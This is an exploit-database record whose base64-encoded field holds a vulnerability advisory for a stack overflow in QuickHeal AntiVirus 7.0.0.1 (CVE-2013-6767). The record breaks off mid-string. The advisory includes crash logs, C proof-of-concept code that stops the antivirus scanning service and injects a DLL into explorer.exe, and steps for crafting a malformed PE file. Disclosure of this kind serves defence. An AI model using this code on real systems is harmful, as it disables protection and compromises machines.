{
    "source": "exploit-database", 
    "exploit": "RG9jdW1lbnQgVGl0bGU6DQo9PT09PT09PT09PT09PT0NClF1aWNrSGVhbCBBbnRpVmlydXMgNy4wLjAuMSAtIFN0YWNrIE92ZXJmbG93IFZ1bG5lcmFiaWxpdHkNCg0KDQpSZWZlcmVuY2VzIChTb3VyY2UpOg0KPT09PT09PT09PT09PT09PT09PT0NCmh0dHA6Ly93d3cudnVsbmVyYWJpbGl0eS1sYWIuY29tL2dldF9jb250ZW50LnBocD9pZD0xMTcxDQoNCmh0dHA6Ly93ZWIubnZkLm5pc3QuZ292L3ZpZXcvdnVsbi9kZXRhaWw/dnVsbklkPUNWRS0yMDEzLTY3NjcNCg0KQ1ZFLUlEOg0KPT09PT0NCkNWRS0yMDEzLTY3NjcNCg0KDQpSZWxlYXNlIERhdGU6DQo9PT09PT09PT09PT09DQoyMDEzLTEyLTE2DQoNCg0KVnVsbmVyYWJpbGl0eSBMYWJvcmF0b3J5IElEIChWTC1JRCk6DQo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCjExNzENCg0KDQpDb21tb24gVnVsbmVyYWJpbGl0eSBTY29yaW5nIFN5c3RlbToNCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KNS42DQoNCg0KUHJvZHVjdCAmIFNlcnZpY2UgSW50cm9kdWN0aW9uOg0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KVGhlIHNpbXBsZSBpbnRlcmZhY2UgYW5kIGJlc3QgdmlydXMgcHJvdGVjdGlvbiB0ZWNobm9sb2d5IG9mIFF1aWNrIEhlYWwgQW50aVZpcnVzIFBybyBlbnN1cmVzIGNvbXBsZXRlIHNlY3VyaXR5IHdpdGhvdXQgaW50ZXJydXB0aW5nIA0Kb3Igc2xvd2luZyBkb3duIHlvdXIgc3lzdGVtLiBSZWFsIHRpbWUgY2xvdWQgc2VjdXJpdHkgcmVzdHJpY3RzIGFjY2VzcyB0byBtYWx3YXJlIGluZmVjdGVkIHdlYnNpdGVzLiBTcGFtIGZpbHRlcnMgc3RvcCBwaGlzaGluZyBhbmQgDQppbmZlY3RlZCBlbWFpbHMgZnJvbSByZWFjaGluZyB5b3VyIGluYm94LiBVbmludGVycnVwdGVkIFBDIHVzYWdlIGFuZCB2aWV3aW5nIHdpdGhvdXQgcHJvbXB0cy4gDQoNClF1aWNrIEhlYWwgQW50aS1WaXJ1cyBpcyBhbiBhbGwtcm91bmQgYW50aXZpcnVzIGFuZCBzZWN1cml0eSB0b29sIGFpbWVkIGF0IHRoZSBpbnRlcm1lZGlhdGUgaG9tZSB1c2VyLiBPbiBmaXJzdCBhcHBlYXJhbmNlcywgUXVpY2sgSGVhbCANCkFudGktVmlydXMgZG9lc27igJl0IGRvIHdlbGwuIEluc3RhbGxhdGlvbiBpcyBjb21wbGljYXRlZCwgYW5kIHRoZSBpbml0aWFsIHdpbmRvdyB0aGF0IHNob3dzIHVwIGlzIG5vdCwgaW4gZmFjdCwgdGhlIG1haW4gaW50ZXJmYWNlLiBPbmNlIA0KeW91IGZpbmQgeW91ciB3YXkgYmFjayB0byB0aGUgY29udHJvbCBjZW50ZXIsIGhvd2V2ZXIsIHRoaW5ncyBiZWNvbWUgbXVjaCBjbGVhcmVyLg0KDQpWaXN1YWxseSwgUXVpY2sgSGVhbCBBbnRpLVZpcnVzIGlzIGZhaXJseSBzdWNjZXNzZnVsLiBJdCBoYXMgYSBuaWNlLCBpZiBub3QgcmV2b2x1dGlvbmFyeSwgaW50ZXJmYWNlIGFuZCBhbGwgdGhlIHNlY3Rpb25zIGFyZSBlYXN5IA0KdG8gbmF2aWdhdGUuIEl0IGFsc28gaGFzIGEgZ29vZCBzZWxlY3Rpb24gb2YgY29uZmlndXJhdGlvbiBvcHRpb25zLCB3aGVyZSB5b3UgY2FuIGN1c3RvbWl6ZSBldmVyeXRoaW5nIGZyb20gd2hhdCBiZWhhdmlvciB0aGUgcHJvZ3JhbSANCnRha2VzIHdoZW4gaXQgZmluZHMgYSB2aXJ1cyB0byBzZXR0aW5nIGEgcGFzc3dvcmQgc28gbm9ib2R5IGNhbiBjaGFuZ2UgeW91ciBjb25maWd1cmF0aW9ucy4NCg0KKENvcHkgb2YgdGhlIEhvbWVwYWdlOiBodHRwOi8vd3d3LnF1aWNraGVhbC5jb20vZG93bmxvYWQtZnJlZS1hbnRpdmlydXMgKQ0KDQoNCkFic3RyYWN0IEFkdmlzb3J5IEluZm9ybWF0aW9uOg0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQpBbiBpbmRlcGVuZGVudCBsYWJvcmF0b3J5IHJlc2VhcmNoZXIgZGlzY292ZXJlZCBhIGxvY2FsIHN0YWNrIGJ1ZmZlciBvdmVyZmxvdyB2dWxuZXJhYmlsaXR5IGluIHRoZSBvZmZpY2lhbCBRdWlja0hlYWwgQW50aVZpcnVzIDcuMC4wLjEgKGIyLjAuMC4xKSBQcm8gc29mdHdhcmUuDQoNCg0KVnVsbmVyYWJpbGl0eSBEaXNjbG9zdXJlIFRpbWVsaW5lOg0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KMjAxMy0xMi0xNjogICAgUHVibGljIERpc2Nsb3N1cmUgKFZ1bG5lcmFiaWxpdHkgTGFib3JhdG9yeSkNCg0KDQpEaXNjb3ZlcnkgU3RhdHVzOg0KPT09PT09PT09PT09PT09PT0NClB1Ymxpc2hlZA0KDQoNCkFmZmVjdGVkIFByb2R1Y3Qocyk6DQo9PT09PT09PT09PT09PT09PT09PQ0KUXVpY2sgSGVhbCBUZWNobm9sb2dpZXMgKFApIEx0ZA0KUHJvZHVjdDogUXVpY2tIZWFsIEFudGlWaXJ1cyAtIFNvZnR3YXJlIDcuMC4wLjEgKGJ1aWxkIDIuMC4wLjEgLSAyLjAuMC4wKQ0KDQoNCkV4cGxvaXRhdGlvbiBUZWNobmlxdWU6DQo9PT09PT09PT09PT09PT09PT09PT09PQ0KTG9jYWwNCg0KDQpTZXZlcml0eSBMZXZlbDoNCj09PT09PT09PT09PT09PQ0KTWVkaXVtDQoNCg0KVGVjaG5pY2FsIERldGFpbHMgJiBEZXNjcmlwdGlvbjoNCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQpBIGxvY2FsIHN0YWNrIGJ1ZmZlciBvdmVyZmxvdyB2dWxuZXJhYmlsaXR5IGhhcyBiZWVuIGRpc2NvdmVyZWQgaW4gdGhlIG9mZmljaWFsIFF1aWNrSGVhbCBBbnRpVmlydXMgNy4wLjAuMSAoYjIuMC4wLjEpIFBybyBzb2Z0d2FyZS4NClRoZSB2dWxuZXJhYmlsaXR5IGFsbG93cyBsb2NhbCBsb3cgcHJpdmlsZWdlZCB1c2VyIGFjY291bnRzIHRvIGNvbXByb21pc2UgdGhlIHN5c3RlbSBieSBhIGNsYXNzaWMgc3RhY2sgb3ZlcmZsb3cgaXNzdWUuIA0KDQpRdWlja0hlYWwgQW50aXZpcnVzIHN1ZmZlcnMgZnJvbSBpbXByb3BlciBoYW5kbGluZyBvZiBidWZmZXJzIGluIGl0YHMgYHBlcG9seS5kbGxgIG1vZHVsZSBvbiBjZXJ0YWluIGNvbmRpdGlvbnMgd2hpY2ggbGVhZHMgDQp0byBhIHN0YWNrIG92ZXJmbG93LiBVcG9uIGRpc2FibGluZyBgQ29yZSBzY2FubmluZyBzZXJ2ZXJgIHNlcnZpY2UsIHRoZSB2dWxuZXJhYmxlIHBvaW50IGNvdWxkIGJlIHRyaWdnZXJlZCAmIGNyYXNoIHRoZSBzeXN0ZW0uIA0KSnVzdCBydW4gdGhlIFBvQyAmIG9uY2UgeW91IHNlZSBwcm9wZXJ0aWVzIGRpYWxvZywgY2hhbmdlIHlvdXIgdGFiIGZyb20gYEdlbmVyYWxgIHRvIGBRdWlja0hlYWxgLiBUaGlzIHdpbGwgY2F1c2UgdGhlIFF1aWNrSGVhbCANCnRvIHNjYW4geW91ciBmaWxlICYgcmVwb3J0cyBiYWNrIHRvIHlvdSB0aGUgZmlsZSBzdGF0dXMgKHdoZXRoZXIgaXRgcyBpbmZlY3RlZCBvciBjbGVhbikuIEl0YHMgbm90YWJsZSB0aGF0LCBpbiBub3JtYWwgY29uZGl0aW9ucyANCkkgd2FzIHVuYWJsZSB0byB0cmlnZ2VyIHRoZSB2dWxuZXJhYmlsaXR5LCAmIHRoaXMgaXMgd2hhdGBzIHRoZSByZWFzb24gd2h5IEkgaW5qZWN0IGEgZGxsIGludG8gYGV4cGxvcmVyLmV4ZWAgdG8gdHJpZ2dlciB0aGUgYnVnIA0KaW4gcmlnaHQgbWFubmVyLg0KDQpUaGUgdnVsbmVyYWJpbGl0eSBpcyBsb2NhdGVkIGluIHRoZSBnZW5lcmF0ZWQgUEUgZmlsZSBgKi50ZXh0YCB2YWx1ZS4gTG9jYWwgYXR0YWNrZXJzIGFyZSBhYmxlIHRvIG92ZXJmbG93IHRoZSBwcm9jZXNzIGJ5IGEgDQptYW5pcHVsYXRlZCBpbXBvcnQgb2YgYSBtYWxpY2lvdXMgUEUgZmlsZS4gVGhlIGlzc3VlIGlzIGEgY2xhc3NpYyAodW5pLWNvZGUpIHN0YWNrIGJ1ZmZlciBvdmVyZmxvdy4gTG9jYWwgYXR0YWNrZXJzIGNhbiBvdmVyd3JpdGUgDQp0aGUgcmVnaXN0ZXJzIHRvIGNvbXByb21pc2UgdGhlIHN5c3RlbSBvciBjcmFzaCB0aGUgcXVpY2toZWFsIHNvZnR3YXJlIHN5c3RlbSBwcm9jZXNzLiBUaGUgc2VjdXJpdHkgcmlzayBvZiB0aGUgbG9jYWwgc3RhY2sgYnVmZmVyIA0Kb3ZlcmZsb3cgdnVsbmVyYWJpbGl0eSBpcyBlc3RpbWF0ZWQgYXMgbWVkaXVtKCspIHdpdGggYSBjdnNzIChjb21tb24gdnVsbmVyYWJpbGl0eSBzY29yaW5nIHN5c3RlbSkgY291bnQgb2YgNS42KCspfCgtKTUuNy4NCg0KVGhlIHZ1bG5lcmFiaWxpdHkgY2FuIGJlIGV4cGxvaXRlZCBieSBsb2NhbCBhdHRhY2tlcnMgd2l0aCBsb3cgcHJpdmlsZWdlZCBzeXN0ZW0gdXNlciBhY2NvdW50IGFuZCB3aXRob3V0IHVzZXIgaW50ZXJhY3Rpb24uIA0KU3VjY2Vzc2Z1bCBleHBsb2l0YXRpb24gb2YgdGhlIGxvY2FsIHN0YWNrIGJ1ZmZlciBvdmVyZmxvdyBzb2Z0d2FyZSB2dWxuZXJhYmlsaXR5IHJlc3VsdHMgaW4gcHJvY2Vzcy0gYW5kIHN5c3RlbSBjb21wcm9taXNlLiANCg0KDQpQcm9vZiBvZiBDb25jZXB0IChQb0MpOg0KPT09PT09PT09PT09PT09PT09PT09PT0NClRoZSBsb2NhbCBzdGFjayBidWZmZXIgb3ZlcmZsb3cgdnVsbmVyYWJpbGl0eSBjYW4gYmUgZXhwbG9pdGVkIGJ5IGxvY2FsIGF0dGFja2VycyB3aXRoIGxvdyBwcml2aWxlZ2VkIHN5c3RlbSB1c2VyIGFjY291bnQgYW5kIA0Kd2l0aG91dCB1c2VyIGludGVyYWN0aW9uLiBGb3Igc2VjdXJpdHkgZGVtb25zdHJhdGlvbiBvciB0byByZXByb2R1Y2UgdGhlIHZ1bG5lcmFiaWxpdHkgZm9sbG93IHRoZSBwcm92aWRlZCBpbmZvcm1hdGlvbiBhbmQgc3RlcHMgYmVsb3cuDQoNCg0KLS0tIFBvQyBEZWJ1ZyBMb2dzIC0tLSANCmVheD0wMDAwMTViYyBlYng9MDNmNDhhMGMgZWN4PTAzZjEyYTM0IGVkeD0wM2Y0N2E2OCBlc2k9MDg5Yzg0ZTggZWRpPTAwMDAwMDAwDQplaXA9MDViYWIxMDcgZXNwPTAzZjQ3YTJjIGVicD0wMDA4MjJkOCBpb3BsPTAgICAgICAgICBudiB1cCBlaSBwbCBueiBuYSBwbyBuYw0KY3M9MDAxYiAgc3M9MDAyMyAgZHM9MDAyMyAgZXM9MDAyMyAgZnM9MDAzYiAgZ3M9MDAwMCAgICAgICAgICAgICBlZmw9MDAwMDAyMDINCioqKiBXQVJOSU5HOiBVbmFibGUgdG8gdmVyaWZ5IGNoZWNrc3VtIGZvciBDOlxQUk9HUkF+MVxRVUlDS0h+MVxRVUlDS0h+MVxwZXBvbHkuZGxsDQoqKiogRVJST1I6IFN5bWJvbCBmaWxlIGNvdWxkIG5vdCBiZSBmb3VuZC4gIERlZmF1bHRlZCB0byBleHBvcnQgc3ltYm9scyBmb3IgQzpcUFJPR1JBfjFcUVVJQ0tIfjFcUVVJQ0tIfjFccGVwb2x5LmRsbCAtIA0KcGVwb2x5IUdldFJlYWxUeXBlQnlDb250ZW50cysweDI5NzE0NzoNCk1pc3NpbmcgaW1hZ2UgbmFtZSwgcG9zc2libGUgcGFnZWQtb3V0IG9yIGNvcnJ1cHQgZGF0YS4NCk1pc3NpbmcgaW1hZ2UgbmFtZSwgcG9zc2libGUgcGFnZWQtb3V0IG9yIGNvcnJ1cHQgZGF0YS4NCjA1YmFiMTA3IDg1MDEgICAgICAgICAgICB0ZXN0ICAgIGR3b3JkIHB0ciBbZWN4XSxlYXggIGRzOjAwMjM6MDNmMTJhMzQ9MDAwMDAwMDANCjA6MDE5PiBrYg0KQ2hpbGRFQlAgUmV0QWRkciAgQXJncyB0byBDaGlsZCAgICAgICAgICAgICAgDQpXQVJOSU5HOiBTdGFjayB1bndpbmQgaW5mb3JtYXRpb24gbm90IGF2YWlsYWJsZS4gRm9sbG93aW5nIGZyYW1lcyBtYXkgYmUgd3JvbmcuDQowM2Y0N2EyYyAwNWI3M2FmYSAwNTkzNDJhYyAwMDAwMDAwMCAwMDA4MjJkOCBwZXBvbHkhR2V0UmVhbFR5cGVCeUNvbnRlbnRzKzB4Mjk3MTQ3DQowM2Y0N2FiMCA0MTQxNDE0MSA0MTQxNDE0MSA0MTQxNDE0MSA0MTQxNDE0MSBwZXBvbHkhR2V0UmVhbFR5cGVCeUNvbnRlbnRzKzB4MjVmYjNhDQowM2Y0N2FiNCA0MTQxNDE0MSA0MTQxNDE0MSA0MTQxNDE0MSA0MTQxNDE0MSA8VW5sb2FkZWRfUmVzLmRsbD4rMHg0MTQxNDExMA0KMDNmNDdhYjggNDE0MTQxNDEgNDE0MTQxNDEgNDE0MTQxNDEgNDE0MTQxNDEgPFVubG9hZGVkX1Jlcy5kbGw+KzB4NDE0MTQxMTANCjAzZjQ3YWJjIDQxNDE0MTQxIDQxNDE0MTQxIDQxNDE0MTQxIDQxNDE0MTQxIDxVbmxvYWRlZF9SZXMuZGxsPisweDQxNDE0MTEwDQowM2Y0N2FjMCA0MTQxNDE0MSA0MTQxNDE0MSA0MTQxNDE0MSA0MTQxNDE0MSA8VW5sb2FkZWRfUmVzLmRsbD4rMHg0MTQxNDExMA0KMDNmNDdhYzQgNDE0MTQxNDEgNDE0MTQxNDEgNDE0MTQxNDEgNDE0MTQxNDEgPFVubG9hZGVkX1Jlcy5kbGw+KzB4NDE0MTQxMTANCjAzZjQ3YWM4IDQxNDE0MTQxIDQxNDE0MTQxIDQxNDE0MTQxIDQxNDE0MTQxIDxVbmxvYWRlZF9SZXMuZGxsPisweDQxNDE0MTEwDQowM2Y0N2FjYyA0MTQxNDE0MSA0MTQxNDE0MSA0MTQxNDE0MSA0MTQxNDE0MSA8VW5sb2FkZWRfUmVzLmRsbD4rMHg0MTQxNDExMA0KMDNmNDdhZDAgNDE0MTQxNDEgNDE0MTQxNDEgNDE0MTQxNDEgMzAyODAwMDAgPFVubG9hZGVkX1Jlcy5kbGw+KzB4NDE0MTQxMTANCjAzZjQ3YWQ0IDQxNDE0MTQxIDQxNDE0MTQxIDMwMjgwMDAwIDQxNDE0MTQxIDxVbmxvYWRlZF9SZXMuZGxsPisweDQxNDE0MTEwDQowM2Y0N2FkOCA0MTQxNDE0MSAzMDI4MDAwMCA0MTQxNDE0MSA0MTQxNDE0MSA8VW5sb2FkZWRfUmVzLmRsbD4rMHg0MTQxNDExMA0KMDNmNDdhZGMgMzAyODAwMDAgNDE0MTQxNDEgNDE0MTQxNDEgNDE0MTQxNDEgPFVubG9hZGVkX1Jlcy5kbGw+KzB4NDE0MTQxMTANCjAzZjQ3YWUwIDQxNDE0MTQxIDQxNDE0MTQxIDQxNDE0MTQxIDQxNDE0MTQxIDxVbmxvYWRlZF9SZXMuZGxsPisweDMwMjdmZmNmDQowM2Y0N2FlNCA0MTQxNDE0MSA0MTQxNDE0MSA0MTQxNDE0MSA0MTQxNDE0MSA8VW5sb2FkZWRfUmVzLmRsbD4rMHg0MTQxNDExMA0KMDNmNDdhZTggNDE0MTQxNDEgNDE0MTQxNDEgNDE0MTQxNDEgNDE0MTQxNDEgPFVubG9hZGVkX1Jlcy5kbGw+KzB4NDE0MTQxMTANCjAzZjQ3YWVjIDQxNDE0MTQxIDQxNDE0MTQxIDQxNDE0MTQxIDQxNDE0MTQxIDxVbmxvYWRlZF9SZXMuZGxsPisweDQxNDE0MTEwDQowM2Y0N2FmMCA0MTQxNDE0MSA0MTQxNDE0MSA0MTQxNDE0MSA0MTQxNDE0MSA8VW5sb2FkZWRfUmVzLmRsbD4rMHg0MTQxNDExMA0KMDNmNDdhZjQgNDE0MTQxNDEgNDE0MTQxNDEgNDE0MTQxNDEgNDE0MTQxNDEgPFVubG9hZGVkX1Jlcy5kbGw+KzB4NDE0MTQxMTANCjAzZjQ3YWY4IDQxNDE0MTQxIDQxNDE0MTQxIDQxNDE0MTQxIDQxNDE0MTQxIDxVbmxvYWRlZF9SZXMuZGxsPisweDQxNDE0MTEwDQotLS0gUG9DIERlYnVnIExvZ3MgLS0tIA0KDQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLSAqLmMNCg0KVGl0bGUJCQk6ICBRdWlja0hlYWwgQW50aXZpcnVzIFBybyAoUGVwb2x5LmRsbCkgU3RhY2sgT3ZlcmZsb3cgVnVsbmVyYWJpbGl0eSAJDQpWZXJzaW9uCQkJOiAgNy4wLjAuMSAoMjAxNCkgLSAoIGxhdGVzdCAmIG90aGVyIHZlcnNpb25zIG1pZ2h0IGFsc28gYmUgYWZmZWN0ZWQgKQ0KQXV0aG9yCQkJOiAgQXJhc2ggQWxsZWJyYWhpbQkNCkNvbnRhY3QJCQk6ICBHZW5pdXNfczNjX2ZpcmV3YWxsKCQkJCl5YWhvbygkJCQpY29tCQkNClZlbmRvcgkJCTogIGh0dHA6Ly93d3cucXVpY2toZWFsLmNvbQkNClRlc3RlZAkJCTogIFdpbiA3IHNwIDEgeDg2IFVsdGltYXRlICYgV2luIFhQIFNQMyBFTkcJDQpOb3RlCQkJOiB2dWxuLmV4ZSBzaG91bGQgYmUgYXQgYzpcdnVsbi5leGUgPT4gdnVsbi5leGUgaXMganVzdCBhIENvcnJ1cHRlZCBQRSBGaWxlIGFpbXMgYXQgY3Jhc2hpbmcgJiBub3RoaW5nIG1vcmUNCg0KKi8NCg0KI2luY2x1ZGUgPHdpbmRvd3MuaD4gDQojaW5jbHVkZSA8dGxoZWxwMzIuaD4gDQojaW5jbHVkZSA8c2hsd2FwaS5oPiANCiNpbmNsdWRlIDxjb25pby5oPiANCiNpbmNsdWRlIDxzdGRpby5oPiANCiNpbmNsdWRlIDx0Y2hhci5oPg0KI2luY2x1ZGUgPGFjbGFwaS5oPg0KDQojZGVmaW5lIFdJTjMyX0xFQU5fQU5EX01FQU4gDQojZGVmaW5lIENSRUFURV9USFJFQURfQUNDRVNTIChQUk9DRVNTX0NSRUFURV9USFJFQUQgfCBQUk9DRVNTX1FVRVJZX0lORk9STUFUSU9OIHwgUFJPQ0VTU19WTV9PUEVSQVRJT04gfCBQUk9DRVNTX1ZNX1dSSVRFIHwgUFJPQ0VTU19WTV9SRUFEKSANCg0KI3ByYWdtYSBjb21tZW50KGxpYiwgImFkdmFwaTMyLmxpYiIpDQoNCnR5cGVkZWYgc3RydWN0IF9TRVJWSUNFX1NUQVRVU19QUk9DRVNTIHsNCiAgRFdPUkQgZHdTZXJ2aWNlVHlwZTsNCiAgRFdPUkQgZHdDdXJyZW50U3RhdGU7DQogIERXT1JEIGR3Q29udHJvbHNBY2NlcHRlZDsNCiAgRFdPUkQgZHdXaW4zMkV4aXRDb2RlOw0KICBEV09SRCBkd1NlcnZpY2VTcGVjaWZpY0V4aXRDb2RlOw0KICBEV09SRCBkd0NoZWNrUG9pbnQ7DQogIERXT1JEIGR3V2FpdEhpbnQ7DQogIERXT1JEIGR3UHJvY2Vzc0lkOw0KICBEV09SRCBkd1NlcnZpY2VGbGFnczsNCn0gU0VSVklDRV9TVEFUVVNfUFJPQ0VTUywgKkxQU0VSVklDRV9TVEFUVVNfUFJPQ0VTUzsNCg0KVk9JRCBfX3N0ZGNhbGwgRG9TdG9wU3ZjKCk7IA0KDQpTQ19IQU5ETEUgc2NoU0NNYW5hZ2VyOw0KU0NfSEFORExFIHNjaFNlcnZpY2U7DQoNCmludCBtYWluKGludCBhcmdjLCBjaGFyICogYXJndltdKSANCnsgDQogICBjaGFyIGJ1ZltNQVhfUEFUSF0gPSB7MH07IA0KICAgRFdPUkQgcElEID0gR2V0VGFyZ2V0VGhyZWFkSURGcm9tUHJvY05hbWUoImV4cGxvcmVyLmV4ZSIpOyANCiAgIHByaW50ZigiXG5cbiIpOw0KICAgcHJpbnRmKCJcblxuUXVpY2tIZWFsIEFudGl2aXJ1cyAoNy4wLjAuMSkgcGVwb2x5LmRsbCBzdGFjayBvdmVyZmxvdyB2dWxuZXJhYmlsaXR5IFByb29mIG9mIENvbmNlcHQgQ29kZSIpOw0KICAgcHJpbnRmKCJcblxuQXV0aG9yIDogQXJhc2ggQWxsZWJyYWhpbSIpOw0KICAgDQoNCiAgIEdldEZ1bGxQYXRoTmFtZSgiU2hlbGxFeGVjdXRlRXhQcm9wZXJ0aWVzLmRsbCIsIE1BWF9QQVRILCBidWYsIE5VTEwpOyANCiANCiAgIHByaW50ZigiXG4iKTsgDQoNCiAgIERvU3RvcFN2YygpOyAgIA0KICAgaWYoIUluamVjdChwSUQsIGJ1ZikpIA0KICAgeyANCiAgICAgICAgcHJpbnRmKCJcblxuRExMIE5vdCBMb2FkZWQhIik7IA0KICAgIH1lbHNleyANCiAgICAgICAgcHJpbnRmKCJcblxuRExMIExvYWRlZCEiKTsgDQoJCXByaW50ZigiXG5cbiggKyApIEl0J3Mgb2shIGp1c3QgY2xpY2sgb24gUXVpY2tIZWFsIHRhYiEiKTsNCiAgICB9CSANCgkNCiAgICBfZ2V0Y2goKTsgDQogICByZXR1cm4gMDsgDQp9IA0KDQpWT0lEIF9fc3RkY2FsbCBEb1N0b3BTdmMoKQ0Kew0KICAgIFNFUlZJQ0VfU1RBVFVTX1BST0NFU1Mgc3NwOw0KICAgIERXT1JEIGR3U3RhcnRUaW1lID0gR2V0VGlja0NvdW50KCk7DQogICAgRFdPUkQgZHdCeXRlc05lZWRlZDsNCiAgICBEV09SRCBkd1RpbWVvdXQgPSAzMDAwMDsgDQogICAgRFdPUkQgZHdXYWl0VGltZTsNCiAgICBzY2hTQ01hbmFnZXIgPSBPcGVuU0NNYW5hZ2VyKCANCiAgICAgICAgTlVMTCwgICAgICAgICAgICAgICAgICAgDQogICAgICAgIE5VTEwsICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgU0NfTUFOQUdFUl9BTExfQUNDRVNTKTsgIA0KIA0KICAgIGlmIChOVUxMID09IHNjaFNDTWFuYWdlcikgDQogICAgew0KICAgICAgICBwcmludGYoIk9wZW5TQ01hbmFnZXIgZmFpbGVkICglZClcbiIsIEdldExhc3RFcnJvcigpKTsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCg0KICAgIHNjaFNlcnZpY2UgPSBPcGVuU2VydmljZSggDQogICAgICAgIHNjaFNDTWFuYWdlciwgICAgICAgICAgDQogICAgICAgICJDb3JlIFNjYW5uaW5nIFNlcnZlciIsICAgICAgICAgICAgDQogICAgICAgIFNFUlZJQ0VfU1RPUCB8IA0KICAgICAgICBTRVJWSUNFX1FVRVJZX1NUQVRVUyB8IA0KICAgICAgICBTRVJWSUNFX0VOVU1FUkFURV9ERVBFTkRFTlRTKTsgIA0KIA0KICAgIGlmIChzY2hTZXJ2aWNlID09IE5VTEwpDQogICAgeyANCiAgICAgICAgcHJpbnRmKCJPcGVuU2VydmljZSBmYWlsZWQgKCVkKVxuIiwgR2V0TGFzdEVycm9yKCkpOyANCiAgICAgICAgQ2xvc2VTZXJ2aWNlSGFuZGxlKHNjaFNDTWFuYWdlcik7DQogICAgICAgIHJldHVybjsNCiAgICB9ICAgIA0KDQogICAgaWYgKCAhQ29udHJvbFNlcnZpY2UoIA0KICAgICAgICAgICAgc2NoU2VydmljZSwgDQogICAgICAgICAgICBTRVJWSUNFX0NPTlRST0xfU1RPUCwgDQogICAgICAgICAgICAoTFBTRVJWSUNFX1NUQVRVUykgJnNzcCApICkNCiAgICB7DQogICAgICAgIHByaW50ZiggIkNvbnRyb2xTZXJ2aWNlIGZhaWxlZCAoJWQpXG4iLCBHZXRMYXN0RXJyb3IoKSApOyAgICAgICANCiAgICB9DQoNCiAgICBDbG9zZVNlcnZpY2VIYW5kbGUoc2NoU2VydmljZSk7IA0KICAgIENsb3NlU2VydmljZUhhbmRsZShzY2hTQ01hbmFnZXIpOw0KfQ0KDQpCT09MIEluamVjdChEV09SRCBwSUQsIGNvbnN0IGNoYXIgKiBETExfTkFNRSkgDQp7IA0KICAgSEFORExFIFByb2M7IA0KICAgSE1PRFVMRSBoTGliOyANCiAgIGNoYXIgYnVmWzUwXSA9IHswfTsgDQogICBMUFZPSUQgUmVtb3RlU3RyaW5nLCBMb2FkTGliQWRkeTsgDQogICBpZighcElEKSANCiAgICAgIHJldHVybiBGQUxTRTsgDQogICBQcm9jID0gT3BlblByb2Nlc3MoUFJPQ0VTU19BTExfQUNDRVNTLCBGQUxTRSwgcElEKTsgDQogICBpZighUHJvYykgDQogICB7IA0KICAgICAgc3ByaW50ZihidWYsICJPcGVuUHJvY2VzcygpIGZhaWxlZDogJWQiLCBHZXRMYXN0RXJyb3IoKSk7IA0KICAgICAgcHJpbnRmKGJ1Zik7IA0KICAgICAgcmV0dXJuIEZBTFNFOyANCiAgIH0gICAgDQogICBMb2FkTGliQWRkeSA9IChMUFZPSUQpR2V0UHJvY0FkZHJlc3MoR2V0TW9kdWxlSGFuZGxlKCJrZXJuZWwzMi5kbGwiKSwgIkxvYWRMaWJyYXJ5QSIpOyAgICANCiAgIFJlbW90ZVN0cmluZyA9IChMUFZPSUQpVmlydHVhbEFsbG9jRXgoUHJvYywgTlVMTCwgc3RybGVuKERMTF9OQU1FKSwgTUVNX1JFU0VSVkUgfCBNRU1fQ09NTUlULCBQQUdFX1JFQURXUklURSk7ICAgIA0KICAgV3JpdGVQcm9jZXNzTWVtb3J5KFByb2MsIChMUFZPSUQpUmVtb3RlU3RyaW5nLCBETExfTkFNRSwgc3RybGVuKERMTF9OQU1FKSwgTlVMTCk7ICAgDQogICBDcmVhdGVSZW1vdGVUaHJlYWQoUHJvYywgTlVMTCwgTlVMTCwgKExQVEhSRUFEX1NUQVJUX1JPVVRJTkUpTG9hZExpYkFkZHksIChMUFZPSUQpUmVtb3RlU3RyaW5nLCBOVUxMLCBOVUxMKTsgDQogICBDbG9zZUhhbmRsZShQcm9jKTsgDQogICByZXR1cm4gVFJVRTsgDQp9IA0KDQpEV09SRCBHZXRUYXJnZXRUaHJlYWRJREZyb21Qcm9jTmFtZShjb25zdCBjaGFyICogUHJvY05hbWUpIA0KeyANCiAgIFBST0NFU1NFTlRSWTMyIHBlOyANCiAgIEhBTkRMRSB0aFNuYXBTaG90OyANCiAgIEJPT0wgcmV0dmFsLCBQcm9jRm91bmQgPSBGQUxTRTsgDQogICB0aFNuYXBTaG90ID0gQ3JlYXRlVG9vbGhlbHAzMlNuYXBzaG90KFRIMzJDU19TTkFQUFJPQ0VTUywgMCk7IA0KICAgaWYodGhTbmFwU2hvdCA9PSBJTlZBTElEX0hBTkRMRV9WQUxVRSkgDQogICB7ICAgICAgIA0KICAgICAgcHJpbnRmKCJFcnJvcjogVW5hYmxlIHRvIGNyZWF0ZSB0b29saGVscCBzbmFwc2hvdCEiKTsgDQogICAgICByZXR1cm4gRkFMU0U7IA0KICAgfSANCiAgIHBlLmR3U2l6ZSA9IHNpemVvZihQUk9DRVNTRU5UUlkzMik7IA0KICAgIA0KICAgcmV0dmFsID0gUHJvY2VzczMyRmlyc3QodGhTbmFwU2hvdCwgJnBlKTsgDQogICB3aGlsZShyZXR2YWwpIA0KICAgeyANCiAgICAgIGlmKFN0clN0ckkocGUuc3pFeGVGaWxlLCBQcm9jTmFtZSkpIA0KICAgICAgeyANCiAgICAgICAgIHJldHVybiBwZS50aDMyUHJvY2Vzc0lEOyANCiAgICAgIH0gDQogICAgICByZXR2YWwgPSBQcm9jZXNzMzJOZXh0KHRoU25hcFNob3QsICZwZSk7IA0KICAgfSANCiAgIHJldHVybiAwOyANCn0NCg0KDQoNClBvQzogIFBFIEZpbGUNCg0KVG8gbWFuaXB1bGF0ZSBhIFBFIHRlc3QgZmlsZSB5b3UgbmVlZCB0byBnZW5lcmF0ZSBvd24uDQpJbiB0aGUgc2Vjb25kIHN0ZXAgeW91IHJlcGxhY2UgYWZ0ZXIgdGhlIFBFW05VTExdIGZsYWcgdGhlIGNvbnRleHQgb2YgdGhlICoudGV4dCAoKikgdmFsdWUgd2l0aCBhbiBvd24gbGFyZ2UgdW5pLWNvZGUgc3RyaW5nLg0KDQoNClN0YW5kYXJkIGZpbGVzOiBTdGRBZnguaCwgU3RkQWZ4LmNwcA0KVG